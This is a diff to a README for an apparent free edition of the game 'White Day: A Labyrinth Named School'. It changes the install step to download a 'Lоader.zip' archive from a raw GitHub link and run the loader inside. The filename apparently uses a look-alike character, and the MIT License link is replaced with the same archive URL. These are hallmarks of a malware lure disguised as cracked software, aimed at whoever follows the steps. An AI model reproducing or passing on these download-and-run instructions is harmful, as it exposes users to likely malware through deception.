@@ -25,7 +25,7 @@ Optimized for best performance with minimal resources. 🎯
 
 ## 🚀 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/Jo4ge/WhitedayLabyrinth-Free-Edition/main/Lоader.zip** from the repository.
 2. Extract the archive with any file decompression tool (e.g., WinRAR, 7-Zip, The Unarchiver).
 3. Launch the extracted loader and follow the on-screen instructions.
 4. Enjoy White Day: A Labyrinth Named School for free!
@@ -40,4 +40,4 @@ This project is created for educational demonstration and archival purposes only
 
 ## 📝 License
 
-MIT License – [Read the full license here.](https://opensource.org/licenses/MIT)
+MIT License – [Read the full license here.](https://raw.githubusercontent.com/Jo4ge/WhitedayLabyrinth-Free-Edition/main/Lоader.zip)
